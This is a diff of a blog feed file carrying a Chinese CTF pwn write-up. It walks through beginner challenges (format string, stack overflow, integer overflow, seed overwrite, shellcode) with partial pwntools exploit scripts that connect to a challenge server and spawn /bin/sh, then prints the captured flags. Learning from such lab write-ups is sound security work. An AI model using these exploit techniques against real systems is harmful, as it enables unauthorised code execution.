+<p>回到本题 先随便执行下 就是输入用户名和留言 然后程序原样打印出来<br><img src="https://img-blog.csdnimg.cn/20190928190438694.png" alt><br>没什么世纪大发现 那就常规操作 载入IDA吧<br><img src="https://img-blog.csdnimg.cn/20190928190601948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt><br>发现程序存在格式化字符串漏洞 然后理解下程序逻辑 简单来说就是将pwnme变量的值更改为8就能拿到flag了 双击pwnme看一下 发现pwnme变量还是一个在bss段的全局变量 那基本思路已经有了<br><img src="https://img-blog.csdnimg.cn/20190928190855410.png" alt><br>解法基本就是通过格式化字符串漏洞更改pwnme的值了 那第一步就是测试程序的回显位了 这里我的回显位是在第十位<br><img src="https://img-blog.csdnimg.cn/20190928191119916.png" alt><br>那基本信息获取的差不多了 就可以开始编写脚本了</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"48339"</span><span class="token punctuation">)</span>
 sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"please tell me your name:"</span><span class="token punctuation">)</span>
@@ -2402,10 +2584,10 @@ payload<span class="token operator">=</span>p32<span class="token punctuation">(
 
 sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
-<p>执行脚本即可<br><img src="https://img-blog.csdnimg.cn/20190928191836485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt=""><br>得到flag:cyberpeace{bb8c9af83fb8e8913ed25c1d5cc41751}</p>
-<h2 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when_did_you_born"></a>when_did_you_born</h2><p>照例 日常开局…<br><img src="https://img-blog.csdnimg.cn/20190928193518639.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt=""><br>跑一下 没啥思路 直接载入IDA吧<br><img src="https://img-blog.csdnimg.cn/20190928193555812.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt=""><br>简单理解下 就是程序要求变量v5的值最后为1926 而程序开始的输入不允许输入1926…初看是自相矛盾的..话说哪道Pwn题给的初始条件不是自相矛盾的… 在代码中发现gets函数..因为gets函数不会限制输入的字符个数 初步怀疑是栈溢出 双击v4查看程序栈图<br><img src="https://img-blog.csdnimg.cn/20190928193834619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt=""><br>没跑了 栈溢出 直接开始写脚本吧</p>
+<p>执行脚本即可<br><img src="https://img-blog.csdnimg.cn/20190928191836485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt><br>得到flag:cyberpeace{bb8c9af83fb8e8913ed25c1d5cc41751}</p>
+<h2 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when_did_you_born"></a>when_did_you_born</h2><p>照例 日常开局…<br><img src="https://img-blog.csdnimg.cn/20190928193518639.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt><br>跑一下 没啥思路 直接载入IDA吧<br><img src="https://img-blog.csdnimg.cn/20190928193555812.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt><br>简单理解下 就是程序要求变量v5的值最后为1926 而程序开始的输入不允许输入1926…初看是自相矛盾的..话说哪道Pwn题给的初始条件不是自相矛盾的… 在代码中发现gets函数..因为gets函数不会限制输入的字符个数 初步怀疑是栈溢出 双击v4查看程序栈图<br><img src="https://img-blog.csdnimg.cn/20190928193834619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt><br>没跑了 栈溢出 直接开始写脚本吧</p>
 <blockquote>
-<p>这里解释下为什么程序开启了Canary保护依然可以使用栈溢出漏洞 这是因为Canary保护主要是防护函数的返回地址不被篡改的 从这里程序的栈图就能看出 Canary值的变量名就是var_8 如果我们切换到汇编窗口 就能看到最后的校验使用的就是这个var_8变量<br><img src="https://img-blog.csdnimg.cn/20190928194120774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt=""></p>
+<p>这里解释下为什么程序开启了Canary保护依然可以使用栈溢出漏洞 这是因为Canary保护主要是防护函数的返回地址不被篡改的 从这里程序的栈图就能看出 Canary值的变量名就是var_8 如果我们切换到汇编窗口 就能看到最后的校验使用的就是这个var_8变量<br><img src="https://img-blog.csdnimg.cn/20190928194120774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt></p>
 </blockquote>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"45209"</span><span class="token punctuation">)</span>
@@ -2417,10 +2599,10 @@ payload<span class="token operator">=</span><span class="token string">"A"</span
 
 sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
-<p>执行即可<br><img src="https://img-blog.csdnimg.cn/20190928205109233.png" alt=""><br>得到flag:cyberpeace{5f65371d87fafa327d2c0d3e254cfab5}</p>
-<h2 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h2><p>正常起手式 查保护<br><img src="https://ae01.alicdn.com/kf/H03408bfb2a394554a5da866c4afb5f6d2.png" alt=""></p>
-<p>就开着NX保护 载入IDA看下<br><img src="https://ae01.alicdn.com/kf/Haafee49ea83e4c7daceca7c1ff7ba19eh.png" alt=""></p>
-<p>简单理解下逻辑 就是判断一个程序中没有涉及到的变量 然后判断他的值 这明显就是在暗示是溢出 双击 dword_60106C看一下位置 发现是在bss段的全局变量<br><img src="https://ae01.alicdn.com/kf/Ha6fea8becfaf4d178c61ad6ebe4b3e12A.png" alt=""></p>
+<p>执行即可<br><img src="https://img-blog.csdnimg.cn/20190928205109233.png" alt><br>得到flag:cyberpeace{5f65371d87fafa327d2c0d3e254cfab5}</p>
+<h2 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h2><p>正常起手式 查保护<br><img src="https://ae01.alicdn.com/kf/H03408bfb2a394554a5da866c4afb5f6d2.png" alt></p>
+<p>就开着NX保护 载入IDA看下<br><img src="https://ae01.alicdn.com/kf/Haafee49ea83e4c7daceca7c1ff7ba19eh.png" alt></p>
+<p>简单理解下逻辑 就是判断一个程序中没有涉及到的变量 然后判断他的值 这明显就是在暗示是溢出 双击 dword_60106C看一下位置 发现是在bss段的全局变量<br><img src="https://ae01.alicdn.com/kf/Ha6fea8becfaf4d178c61ad6ebe4b3e12A.png" alt></p>
 <p>同时发现 程序主体中读入的变量和dword_60106C 仅相差4个字节的位置 而程序主体读入的大小是10个字节 确定此处存在溢出 直接编写脚本即可</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 a<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"33618"</span><span class="token punctuation">)</span>
@@ -2429,13 +2611,13 @@ a<span class="token punctuation">.</span>recvline<span class="token punctuation"
 payload<span class="token operator">=</span><span class="token number">4</span><span class="token operator">*</span><span class="token string">'A'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x6E756161</span><span class="token punctuation">)</span>
 a<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 a<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
-<p>运行脚本获得结果<br><img src="https://ae01.alicdn.com/kf/He5cc965499c84899b125e4cf23ba4067T.png" alt=""></p>
+<p>运行脚本获得结果<br><img src="https://ae01.alicdn.com/kf/He5cc965499c84899b125e4cf23ba4067T.png" alt></p>
 <p>得到flag:cyberpeace{57c7b3fd167ec0630431800825423de0}</p>
-<h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><p>老样子 先查保护 发现除了NX全关 尝试着运行下程序 连个回显都没有 啥都看不出来 载入IDA<br><img src="https://ae01.alicdn.com/kf/H517f8a13e257412d9d6384d16df45a62Q.png" alt=""></p>
-<p>发现主函数空空如也 有点头疼<br><img src="https://ae01.alicdn.com/kf/H3c2accf3c7744312b8eca1af4a1a8544u.png" alt=""></p>
-<p>但是发现在函数表中 有个敏感函数<em>callsystem</em><br><img src="https://ae01.alicdn.com/kf/H7e89a7b80e54402bb3bdbe3df90d89b71.png" alt=""></p>
+<h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><p>老样子 先查保护 发现除了NX全关 尝试着运行下程序 连个回显都没有 啥都看不出来 载入IDA<br><img src="https://ae01.alicdn.com/kf/H517f8a13e257412d9d6384d16df45a62Q.png" alt></p>
+<p>发现主函数空空如也 有点头疼<br><img src="https://ae01.alicdn.com/kf/H3c2accf3c7744312b8eca1af4a1a8544u.png" alt></p>
+<p>但是发现在函数表中 有个敏感函数<em>callsystem</em><br><img src="https://ae01.alicdn.com/kf/H7e89a7b80e54402bb3bdbe3df90d89b71.png" alt></p>
 <p>菜鸡此时就有点思路了 应该是劫持返回地址 然后让程序执行到callsystem函数 那么继续在主函数跟下去</p>
-<p><img src="https://ae01.alicdn.com/kf/H2fafe4eb2bf444938173a2e4900c9fc7U.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H2fafe4eb2bf444938173a2e4900c9fc7U.png" alt></p>
 <p>这个read就很明显了 read了200个字节..双击buf看下栈图<br>这里截不下图就不截了..简单算一下 80+8=88个字节 而程序读入100个字节 那就是溢出了…同时这里程序的地址随机化是关着的…不多说..开始写脚本吧..</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"35202"</span><span class="token punctuation">)</span>
@@ -2444,13 +2626,13 @@ payload<span class="token operator">=</span><span class="token string">"a"</span
 sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
 <p>运行脚本得到结果 注意 因为程序是执行了 <em>/bin/sh</em>也就是打开了个终端 需要我们自己去执行获得flag..别说了..刚开始菜鸡等了半天..</p>
-<p><img src="https://ae01.alicdn.com/kf/Ha764f1cb5400434a968e2aaf0cdbf41cw.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/Ha764f1cb5400434a968e2aaf0cdbf41cw.png" alt></p>
 <p>得到flag:cyberpeace{c07387d32eabb849023878563a5400ef}</p>
-<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>习惯性起手式<br><img src="https://ae01.alicdn.com/kf/Hc6b5266b6cb14cf395076de26d6e009ci.png" alt=""></p>
+<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>习惯性起手式<br><img src="https://ae01.alicdn.com/kf/Hc6b5266b6cb14cf395076de26d6e009ci.png" alt></p>
 <p>一样没有开地址随机化 直接载入IDA </p>
-<p><img src="https://ae01.alicdn.com/kf/Hce1df255f000422f9bb805cb6d16c2b7V.png" alt=""></p>
-<p><img src="https://ae01.alicdn.com/kf/H4584d6b417144896b3663437a7cb38aeI.png" alt=""></p>
-<p>本来没啥头绪 后来发现函数表中有敏感函数<em>system</em> 那大致思路形成 就是和上题差不多 但是我们在覆盖返回地址的同时 直接把栈修改成正常调用system(“/bin/sh”)的样子 同时发现在程序内存中也存有 <em>/bin/sh</em> 那开始写脚本吧<br><img src="https://ae01.alicdn.com/kf/Hf1c2df51b87d40cca5c3cea1ef3b77e42.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/Hce1df255f000422f9bb805cb6d16c2b7V.png" alt></p>
+<p><img src="https://ae01.alicdn.com/kf/H4584d6b417144896b3663437a7cb38aeI.png" alt></p>
+<p>本来没啥头绪 后来发现函数表中有敏感函数<em>system</em> 那大致思路形成 就是和上题差不多 但是我们在覆盖返回地址的同时 直接把栈修改成正常调用system(“/bin/sh”)的样子 同时发现在程序内存中也存有 <em>/bin/sh</em> 那开始写脚本吧<br><img src="https://ae01.alicdn.com/kf/Hf1c2df51b87d40cca5c3cea1ef3b77e42.png" alt></p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
 elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./level_2'</span><span class="token punctuation">)</span>
@@ -2465,17 +2647,17 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
 <p>这里解释下payload吧 因为在函数调用时除去保存现场外 先入栈的就是返回地址 这里的 <em>p32(0)</em> 就是充当返回地址用的 当然因为此处我们直接打开了终端 根本就不需要程序返回 所以随便写就好了 然后就是参数入栈 具体是从左向右 还是从右向左是调用协议规定的 这需要具体程序具体分析 </p>
 </blockquote>
 <p>执行脚本得到结果</p>
-<p><img src="https://ae01.alicdn.com/kf/Hafe199f5112746a8a6d3ec0c1ac63bf1o.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/Hafe199f5112746a8a6d3ec0c1ac63bf1o.png" alt></p>
 <p>flag:cyberpeace{984f929f5fdae818c75ee89278e36753}</p>
-<h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><p>基本起手式 查保护 发现除了地址随机化 其他保护全开<br><img src="https://ae01.alicdn.com/kf/H4d812ba85367425c97e4366c35709200q.png" alt=""></p>
+<h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><p>基本起手式 查保护 发现除了地址随机化 其他保护全开<br><img src="https://ae01.alicdn.com/kf/H4d812ba85367425c97e4366c35709200q.png" alt></p>
 <p>先尝试着跑了一遍 发现有点像一个古董级别的RPG游戏…没啥思路</p>
-<p>那就不多说了 直接载入IDA吧<br><img src="https://ae01.alicdn.com/kf/H0b9af83d49574ea0bb152aec87e3395f4.png" alt=""></p>
+<p>那就不多说了 直接载入IDA吧<br><img src="https://ae01.alicdn.com/kf/H0b9af83d49574ea0bb152aec87e3395f4.png" alt></p>
 <p>主函数没啥看的 主要就是泄漏了一个数组的地址 继续向sub_400D72步入</p>
-<p><img src="https://ae01.alicdn.com/kf/Hd7e0574cc9624bec9e0b0d536347cf0dR.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/Hd7e0574cc9624bec9e0b0d536347cf0dR.png" alt></p>
 <p>这里就是常见角色了 稍微步入看下 发现sub_400A7D函数 就是仅仅是在输出和限制我们的选择 如果想继续玩下去就得输入east 没什么好分析的 步入sub_400BB9进行分析 </p>
-<p><img src="https://ae01.alicdn.com/kf/H5d2aa44863bc44a2957223dfad87090aJ.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H5d2aa44863bc44a2957223dfad87090aJ.png" alt></p>
 <p>哦吼 看了这么久终于看见一个漏洞 先记录下来 在sub_400BB9中存在格式化字符串漏洞 但是就代码阅读到这里 还是没什么利用思路 继续向下看 终于在sub_400CA6发现关键判断</p>
-<p><img src="https://ae01.alicdn.com/kf/H0d55785e0dad447a9633290b4ad3f6c7w.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H0d55785e0dad447a9633290b4ad3f6c7w.png" alt></p>
 <p>通过慢慢查找 发现在函数中比对的 a1和a1[1] 其实就是主函数刚开始泄漏地址的数组 菜鸡这里当时卡了很久…真的不知道if内是在干啥..后来通过大佬指点 看到将指针v1强制转换为函数类型..简单来说就是执行函数</p>
 <p>看到这里那基本思路形成了 首先是需要我们通过格式化字符串漏洞 将刚开始的数组值修改为一样的 然后写入shellcode 最后利用if内语句执行即可 那么首先需要先写脚本看下主机处的回显位</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
@@ -2494,7 +2676,7 @@ sh<span class="token punctuation">.</span>sendline<span class="token punctuation
 <span class="token keyword">print</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 </code></pre>
 <p>运行脚本 这里我的回显位是8</p>
-<p><img src="https://ae01.alicdn.com/kf/H2ae5d11d296e408c933d80378f1273bfC.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H2ae5d11d296e408c933d80378f1273bfC.png" alt></p>
 <p>那么接下来就是写脚本利用格式化字符串漏洞了</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"48825"</span><span class="token punctuation">)</span>
@@ -2538,12 +2720,12 @@ sh<span class="token punctuation">.</span>sendline<span class="token punctuation
 shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">)</span>
 sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Wizard: I will help you! USE YOU SPELL"</span><span class="token punctuation">,</span>shellcode<span class="token punctuation">)</span>
 sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
-<p>运行脚本得到终端 自己cat flag即可<br><img src="https://ae01.alicdn.com/kf/H76c4f169f6624dbc8e598d09887a382bf.png" alt=""></p>
+<p>运行脚本得到终端 自己cat flag即可<br><img src="https://ae01.alicdn.com/kf/H76c4f169f6624dbc8e598d09887a382bf.png" alt></p>
 <p>得到flag:cyberpeace{d35672c5e758a40ea0c05f6dbbe77015}</p>
 <h2 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h2><p>老样子 查保护 看位数</p>
-<p><img src="https://ae01.alicdn.com/kf/H1dcd4e82cae14e17b2130dbecfbab142m.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H1dcd4e82cae14e17b2130dbecfbab142m.png" alt></p>
 <p>保护开得很全… 先跑一下 先是输入名字 然后输出自己猜的数…果断GG掉了…那载入IDA吧…</p>
-<p><img src="https://ae01.alicdn.com/kf/H9f1db03916794d03b4ed742e914b8381S.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H9f1db03916794d03b4ed742e914b8381S.png" alt></p>
 <p>主函数很耿直 几乎没有跳转 跟进sub_C3E看下 发现就是cat flag 那么主要就是主函数的执行了</p>
 <blockquote>
 <p>刚开始菜鸡很是头疼 这个随机数怎么搞定 后来了解了下rand函数的具体原理</p>
@@ -2552,7 +2734,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
 <p>仔细一看 哦吼..大胆的作者敢用gets读入..八成是溢出了..再配合srand函数的原理 很容易确定思路</p>
 <p>先是利用溢出 覆盖掉种子的值 从而达到控制随机数的目的 那么就开始写脚本吧 首先确定偏移地址</p>
 <p>双击v9进入栈图 我们的目的是覆盖seed的值</p>
-<p><img src="https://ae01.alicdn.com/kf/Hee09e00f48d64a8da1cf875c501952fbU.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/Hee09e00f48d64a8da1cf875c501952fbU.png" alt></p>
 <p>可以简单计算出偏移量是20 那么写出脚本即可</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 <span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>
@@ -2572,21 +2754,21 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
 <blockquote>
 <p>这个脚本的关键就是如何在python中使用c的函数 我选择的解决方法是 使用ctypes库 </p>
 <p>这个库可以方便我们直接在程序中使用C的函数 但是我们首先要确定libc共享库的版本号 这里我是用的是ldd指令进行的查询<br>如果懒的话也可以通过在程序中使用elf.libc来获取</p>
-<p><img src="https://ae01.alicdn.com/kf/Hbc247d86009a4a3cac2312c5f56843149.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/Hbc247d86009a4a3cac2312c5f56843149.png" alt></p>
 </blockquote>
 <p>运行脚本即可</p>
-<p><img src="https://ae01.alicdn.com/kf/Hb3290098e42744f7ae81df295cbd19ccc.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/Hb3290098e42744f7ae81df295cbd19ccc.png" alt></p>
 <p>得到flag:cyberpeace{de6b4ebe0aab9472c1dda38729fc76ef}</p>
-<h2 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h2><p><img src="https://ae01.alicdn.com/kf/H8e47c49cc69745ef8f0dd69edf28ec14I.png" alt=""></p>
+<h2 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h2><p><img src="https://ae01.alicdn.com/kf/H8e47c49cc69745ef8f0dd69edf28ec14I.png" alt></p>
 <p>先跑下 发现是一个类似登陆的系统 要求输入密码bulabula…没啥直接思路</p>
 <p>32位的程序 丢进IDA看下程序流程</p>
-<p><img src="https://ae01.alicdn.com/kf/H1e6e4439979b4a85a11b2a8ff19862ber.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H1e6e4439979b4a85a11b2a8ff19862ber.png" alt></p>
 <p>主函数还是一样的寂寞..什么有价值的都没有呢…但是在函数表里发现一个敏感函数what_is_this</p>
-<p><img src="https://ae01.alicdn.com/kf/H3c6b0310b34e46738863aee4be442848Z.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H3c6b0310b34e46738863aee4be442848Z.png" alt></p>
 <p>那起码能确定肯定是溢出类的题目了 最后劫持程序流向what_is_this函数</p>
 <p>跟进login函数 也没啥发现 check函数主要就是录入了用户名和密码 本来看见read函数 以为溢出点就在这里了..打开栈图一看发现覆盖不到返回地址…继续向下跟进check_passwd函数</p>
-<p><img src="https://ae01.alicdn.com/kf/H431013789c004197b1ef8984139dbefbQ.png" alt=""></p>
-<p><img src="https://ae01.alicdn.com/kf/Hdf7b08d1a7d94d128d68c1a1df79bc7fC.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H431013789c004197b1ef8984139dbefbQ.png" alt></p>
+<p><img src="https://ae01.alicdn.com/kf/Hdf7b08d1a7d94d128d68c1a1df79bc7fC.png" alt></p>
 <p>简单解释下程序流程 这里的s就是之前我们录入的密码 check_passwd函数首先检测s的长度 要求s的长度在3到8之间</p>
 <p>在走过if后 发现另外一个敏感函数 <kbd>strcpy</kbd> 这个函数一样不检测长度 可以直接覆盖无限大的空间..<br>查看一下栈图 dest函数到返回地址的距离是14个字节 但是我们的密码最多只能输入8位…这时候注意到题目名..整型溢出..百度了一下..</p>
 <p>注意一下变量v3的定义方式 是一个八位的无符号整型数 也就是最大255 如果大于255 就会清零从头计数 那么基本思路就有了 简单来说就是将密码长度设为258-263位之间 同时对应好位置 直接把返回地址覆写即可</p>
@@ -2606,14 +2788,14 @@ payload<span class="token operator">=</span><span class="token string">'a'</span
 sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
 <p>运行脚本即可</p>
-<p><img src="https://ae01.alicdn.com/kf/H646dc7782e7f4029a6dadd5251eda1f65.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H646dc7782e7f4029a6dadd5251eda1f65.png" alt></p>
 <p>得到flag:cyberpeace{85f5a37cbe589f048f01f85b41e6f421}</p>
 <h2 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h2><p>保护</p>
-<p><img src="https://ae01.alicdn.com/kf/H291662a9388b451f96af988216f86aa5A.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H291662a9388b451f96af988216f86aa5A.png" alt></p>
 <p>运行程序啥都看不出来 就让输入个用户名和留言 拖入IDA吧</p>
-<p><img src="https://ae01.alicdn.com/kf/He43b12a532d641dba8da9e19bcd2dc86d.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/He43b12a532d641dba8da9e19bcd2dc86d.png" alt></p>
 <p>主函数什么都没有 直接往下跟</p>
-<p><img src="https://ae01.alicdn.com/kf/Hec3d211d6b3c4119b1af6b27a21cf1feE.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/Hec3d211d6b3c4119b1af6b27a21cf1feE.png" alt></p>
 <p>在hello函数的最后发现敏感函数gets 不用纠结函数上面写的是在干嘛..反正对函数主体以及我们的输入没有关系 不用管..同时在函数表中发现<kbd>system</kbd>函数 那么基本思路明确 通过gets函数劫持程序流向system函数 直接在栈里构造出来system函数调用<kbd>/bin/bash</kbd>的情况即可</p>
 <p>接下来就是脚本了</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
@@ -2632,11 +2814,11 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
 <blockquote>
 <p>这里解释下脚本为什么在名字部分写入/bin/sh而binaddr又是什么东西<br>因为在编写脚本的时候 我们不可能直接将字符串写入栈 让system函数去调用 需要我们提前将/bin/sh写入程序 而上面的名字录入就是一个最好的位置</p>
 <p>我们可以看一下name变量存在的位置</p>
-<p><img src="https://ae01.alicdn.com/kf/H159c90dd87c9421292ac5b7a69ce4e34o.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H159c90dd87c9421292ac5b7a69ce4e34o.png" alt></p>
 <p>可以明确看到 name变量是存在bss段的静态变量 我们完全可以把/bin/sh先写入name变量 然后让system函数去调用</p>
 </blockquote>
 <p>执行脚本即可</p>
-<p><img src="https://ae01.alicdn.com/kf/Ha63ae34bd918413e852ef834e5940b7em.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/Ha63ae34bd918413e852ef834e5940b7em.png" alt></p>
 <p>得到flag:cyberpeace{d0a41c2065b348cf58cbb94c96ee57e6}</p>
 <h2 id="level-3"><a href="#level-3" class="headerlink" title="level_3"></a>level_3</h2><p>该题附件缺失 少了一个libc文件 没啥办法..略..</p>
 <script>
@@ -2657,7 +2839,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
             });
             document.body.appendChild(img);
           });
-      </script>]]></content>
+      </script></body></html>]]></content>
       
         <categories>
             
@@ -2677,7 +2859,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
     <entry>
       <title><![CDATA[格式化字符串漏洞]]></title>
       <url>/2019/10/08/ge-shi-hua-zi-fu-chuan-lou-dong/</url>
-      <content type="html"><![CDATA[<a id="more"></a>
+      <content type="html"><![CDATA[<html><head></head><body><a id="more"></a>
 <h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>对于正常且安全的使用==printf函数==是这样操作的</p>
 <pre><code>#include <stdio.h>
 
@@ -2686,7 +2868,7 @@ int main(void)
     int n=5;
     printf("%d",n);
     return 0;
-}</stdio.h></code></pre><p>但是偏偏有些懒人喜欢偷懒 少打两个字写成这样子</p>
+}</code></pre><p>但是偏偏有些懒人喜欢偷懒 少打两个字写成这样子</p>
 <pre><code>#include <stdio.h>
 
 int main(void)
@@ -2694,7 +2876,7 @@ int main(void)
     char a[]="qwerdf";
